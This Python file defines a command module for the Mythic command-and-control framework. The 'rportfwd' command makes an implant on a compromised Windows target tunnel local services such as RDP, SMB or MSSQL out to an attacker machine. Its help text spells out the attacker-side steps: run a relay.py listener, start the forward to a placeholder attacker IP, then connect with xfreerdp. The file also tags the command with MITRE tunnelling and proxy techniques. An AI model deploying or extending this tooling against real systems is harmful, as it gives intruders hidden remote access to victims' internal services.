from mythic_container.MythicCommandBase import *


class RportfwdArguments(TaskArguments):
    def __init__(self, command_line, **kwargs):
        super().__init__(command_line, **kwargs)
        self.args = [
            CommandParameter(
                name="action",
                cli_name="Action",
                display_name="Action",
                type=ParameterType.ChooseOne,
                choices=["start", "stop"],
                default_value="start",
                parameter_group_info=[ParameterGroupInfo(ui_position=0, required=True)],
            ),
            CommandParameter(
                name="local_host",
                cli_name="LocalHost",
                display_name="Local Host",
                type=ParameterType.String,
                default_value="127.0.0.1",
                description="Local host on the target (service to tunnel).",
                parameter_group_info=[ParameterGroupInfo(ui_position=1, required=False)],
            ),
            CommandParameter(
                name="local_port",
                cli_name="LocalPort",
                display_name="Local Port",
                type=ParameterType.Number,
                description="Port local sur la cible (ex: 3389 RDP, 445 SMB, 1433 MSSQL).",
                parameter_group_info=[ParameterGroupInfo(ui_position=2, required=True)],
            ),
            CommandParameter(
                name="remote_host",
                cli_name="RemoteHost",
                display_name="Attacker Host",
                type=ParameterType.String,
                description="Attacker IP where relay.py is listening.",
                parameter_group_info=[ParameterGroupInfo(ui_position=3, required=False)],
            ),
            CommandParameter(
                name="remote_port",
                cli_name="RemotePort",
                display_name="Attacker Port (agent)",
                type=ParameterType.Number,
                description="Attacker port for the agent's inbound connection.",
                parameter_group_info=[ParameterGroupInfo(ui_position=4, required=False)],
            ),
        ]

    async def parse_arguments(self):
        self.load_args_from_json_string(self.command_line)


class RportfwdCommand(CommandBase):
    cmd = "rportfwd"
    needs_admin = False
    help_cmd = (
        "# Attaquant :\n"
        "  python3 relay.py 4444 13389\n"
        "# Mythic :\n"
        "  rportfwd -Action start -LocalPort 3389 -RemoteHost <ip> -RemotePort 4444\n"
        "# Puis :\n"
        "  xfreerdp /v:127.0.0.1:13389 ..."
    )
    description = (
        "Reverse port forward: the agent connects a local service on the target to the attacker machine. "
        "Requires relay.py on the attacker side.\n"
        "Flow: target:local_port <-> agent <-> attacker:remote_port <-> relay.py <-> client_port"
    )
    version = 1
    author = "@goultarde"
    argument_class = RportfwdArguments
    attackmapping = ["T1572", "T1090.002"]
    attributes = CommandAttributes(supported_os=[SupportedOS.Windows])

    async def create_go_tasking(
        self, taskData: PTTaskMessageAllData
    ) -> PTTaskCreateTaskingMessageResponse:
        response = PTTaskCreateTaskingMessageResponse(
            TaskID=taskData.Task.ID,
            Success=True,
        )
        action      = taskData.args.get_arg("action") or "start"
        local_host  = taskData.args.get_arg("local_host") or "127.0.0.1"
        local_port  = taskData.args.get_arg("local_port") or 0
        remote_host = taskData.args.get_arg("remote_host") or ""
        remote_port = taskData.args.get_arg("remote_port") or 0

        if action == "stop":
            response.DisplayParams = f"-Action stop -LocalPort {local_port}"
        else:
            response.DisplayParams = (
                f"-Action start {local_host}:{local_port} -> {remote_host}:{remote_port}"
            )
        return response

    async def process_response(
        self, task: PTTaskMessageAllData, response: any
    ) -> PTTaskProcessResponseMessageResponse:
        return PTTaskProcessResponseMessageResponse(TaskID=task.Task.ID, Success=True)
